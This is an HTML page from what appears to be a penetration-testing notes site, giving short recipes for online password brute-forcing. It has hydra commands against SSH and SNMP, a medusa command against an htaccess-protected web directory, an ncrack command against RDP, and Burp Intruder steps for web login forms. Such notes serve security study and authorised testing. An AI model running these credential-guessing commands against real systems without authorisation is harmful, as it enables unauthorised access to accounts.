@@ -1,0 +1,160 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  
+  
+    <meta charset="utf-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    
+    <meta name="author" content="xapax">
+    
+    <link rel="shortcut icon" href="../../img/favicon.ico">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=0" />
+    <title>Online Password Cracking (Brute force) - Notes</title>
+    <link href="../../css/bootstrap-3.3.7.min.css" rel="stylesheet">
+    <link href="../../css/font-awesome-4.7.0.css" rel="stylesheet">
+    <link href="../../css/base.css" rel="stylesheet">
+    <link rel="stylesheet" href="../../css/highlight.css">
+    <!-- HTML5 shim and Respond.js IE8 support of HTML5 elements and media queries -->
+    <!--[if lt IE 9]>
+        <script src="https://oss.maxcdn.com/libs/html5shiv/3.7.0/html5shiv.js"></script>
+        <script src="https://oss.maxcdn.com/libs/respond.js/1.3.0/respond.min.js"></script>
+    <![endif]-->
+
+    <script src="../../js/jquery-3.2.1.min.js"></script>
+    <script src="../../js/bootstrap-3.3.7.min.js"></script>
+    <script src="../../js/highlight.pack.js"></script>
+    
+    <base target="_top">
+    <script>
+      var base_url = '../..';
+      var is_top_frame = false;
+        
+        var pageToc = [
+          {title: "Online password cracking", url: "#_top", children: [
+              {title: "Port 22 - SSH", url: "#port-22-ssh" },
+              {title: "Port 80/443 htaccess", url: "#port-80443-htaccess" },
+              {title: "Port 161 - SNMP", url: "#port-161-snmp" },
+              {title: "Port 3389 - Remote Desktop Protocol", url: "#port-3389-remote-desktop-protocol" },
+          ]},
+        ];
+
+    </script>
+    <script src="../../js/base.js"></script> 
+</head>
+
+<body>
+<script>
+if (is_top_frame) { $('body').addClass('wm-top-page'); }
+</script>
+
+
+
+<div class="container-fluid wm-page-content">
+  <a name="_top"></a>
+    
+
+    
+    
+      
+    
+
+  <div class="row wm-article-nav-buttons" role="navigation" aria-label="navigation">
+    
+    <div class="wm-article-nav pull-right">
+      <a href="../generate_password_list/" class="btn btn-xs btn-default pull-right">
+        Next
+        <i class="fa fa-chevron-right" aria-hidden="true"></i>
+      </a>
+      <a href="../generate_password_list/" class="btn btn-xs btn-link">
+        Generate Password List
+      </a>
+    </div>
+    
+    <div class="wm-article-nav">
+      <a href="../offline_password_cracking/" class="btn btn-xs btn-default pull-left">
+        <i class="fa fa-chevron-left" aria-hidden="true"></i>
+        Previous</a><a href="../offline_password_cracking/" class="btn btn-xs btn-link">
+        Offline Password Cracking
+      </a>
+    </div>
+    
+  </div>
+
+    
+
+    <h1 id="online-password-cracking">Online password cracking<a class="headerlink" href="#online-password-cracking" title="Permanent link">#</a></h1>
+<p>There are several tools specialized for bruteforcing online. There are several different services that are common for bruteforce. For example: VNC, SSH, FTP, SNMP, POP3, HTTP. </p>
+<h2 id="port-22-ssh">Port 22 - SSH<a class="headerlink" href="#port-22-ssh" title="Permanent link">#</a></h2>
+<pre><code>hydra -l root -P wordlist.txt 192.168.0.101 ssh
+hydra -L userlist.txt -P best1050.txt 192.168.1.103 -s 22 ssh -V
+</code></pre>
+
+<h2 id="port-80443-htaccess">Port 80/443 htaccess<a class="headerlink" href="#port-80443-htaccess" title="Permanent link">#</a></h2>
+<p>You can password protect directories with apache pretty easily. Just configure the htaccess (I exaplin this in the chapter on Common ports).</p>
+<p>It can then be brute forced like this:</p>
+<pre><code>medusa -h 192.168.1.101 -u admin -P wordlist.txt -M http -m DIR:/test -T 10
+</code></pre>
+
+<h3 id="logins">Logins<a class="headerlink" href="#logins" title="Permanent link">#</a></h3>
+<p>Use Burp suite. </p>
+<ol>
+<li>Intecept a login attempt.</li>
+<li>Right-lick "Send to intruder". Select Sniper if you have nly one field you want to bruteforce. If you for example already know the username. Otherwise select cluster-attack.</li>
+<li>Select your payload, your wordlist.</li>
+<li>Click attack.</li>
+<li>Look for response-length that differs from the rest.</li>
+</ol>
+<h2 id="port-161-snmp">Port 161 - SNMP<a class="headerlink" href="#port-161-snmp" title="Permanent link">#</a></h2>
+<pre><code>hydra -P wordlist.txt -v 102.168.0.101 snmp
+</code></pre>
+
+<h2 id="port-3389-remote-desktop-protocol">Port 3389 - Remote Desktop Protocol<a class="headerlink" href="#port-3389-remote-desktop-protocol" title="Permanent link">#</a></h2>
+<p>For RDP we can use Ncrack.</p>
+<pre><code>ncrack -vv --user admin -P password-file.txt rdp://192.168.0.101
+</code></pre>
+
+  <br>
+    
+
+    
+    
+      
+    
+
+  <div class="row wm-article-nav-buttons" role="navigation" aria-label="navigation">
+    
+    <div class="wm-article-nav pull-right">
+      <a href="../generate_password_list/" class="btn btn-xs btn-default pull-right">
+        Next
+        <i class="fa fa-chevron-right" aria-hidden="true"></i>
+      </a>
+      <a href="../generate_password_list/" class="btn btn-xs btn-link">
+        Generate Password List
+      </a>
+    </div>
+    
+    <div class="wm-article-nav">
+      <a href="../offline_password_cracking/" class="btn btn-xs btn-default pull-left">
+        <i class="fa fa-chevron-left" aria-hidden="true"></i>
+        Previous</a><a href="../offline_password_cracking/" class="btn btn-xs btn-link">
+        Offline Password Cracking
+      </a>
+    </div>
+    
+  </div>
+
+    <br>
+</div>
+
+<footer class="container-fluid wm-page-content">
+      <p>
+        <a href="https://github.com/xapax/edit/master/docs/password_cracking/online_password_cracking.md"><i class="fa fa-github"></i>
+Edit on GitHub</a>
+      </p>
+  <p>Documentation built with <a href="http://www.mkdocs.org/">MkDocs</a> using <a href="https://github.com/gristlabs/mkdocs-windmill">Windmill</a> theme by Grist Labs.</p>
+</footer>
+
+</body>
+</html>
